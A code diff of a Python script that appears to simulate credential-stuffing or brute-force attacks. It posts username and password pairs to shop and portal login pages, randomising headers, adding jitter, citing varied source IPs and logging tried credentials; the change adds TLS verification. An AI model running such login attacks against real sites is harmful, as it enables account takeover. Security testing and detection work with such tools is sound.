@@ -6,7 +6,7 @@ from pathlib import Path
 sys.path.insert(0, str(Path(__file__).parent.parent))
 
 import requests
-from config import PORTAL_URL, SHOP_URL, USERNAMES, PASSWORDS, LOGS_DIR
+from config import PORTAL_URL, SHOP_URL, USERNAMES, PASSWORDS, LOGS_DIR, TLS_VERIFY
 from utils import print_banner, print_request, jitter, random_headers, GEO_IPS, SessionLog
 
 
@@ -28,7 +28,7 @@ def run() -> dict:
         for url in [f"{SHOP_URL}/login", f"{PORTAL_URL}/login"]:
             try:
                 r = requests.post(url, data={"username": username, "password": password},
-                                  headers=headers, timeout=10, allow_redirects=False)
+                                  headers=headers, timeout=10, allow_redirects=False, verify=TLS_VERIFY)
                 note = f"from {ip}"
                 print_request("POST", url.split("//")[1], r.status_code, note)
                 log.log("POST", url, r.status_code, f"{username}:{password}", note)
@@ -49,7 +49,7 @@ def run() -> dict:
         url = f"{SHOP_URL}/login"
         try:
             r = requests.post(url, data={"username": target, "password": password},
-                              headers=headers, timeout=10, allow_redirects=False)
+                              headers=headers, timeout=10, allow_redirects=False, verify=TLS_VERIFY)
             print_request("POST", f"/login [{target}:{password[:8]}...]", r.status_code)
             log.log("POST", url, r.status_code, f"{target}:{password}")
             if r.status_code in (403, 429):
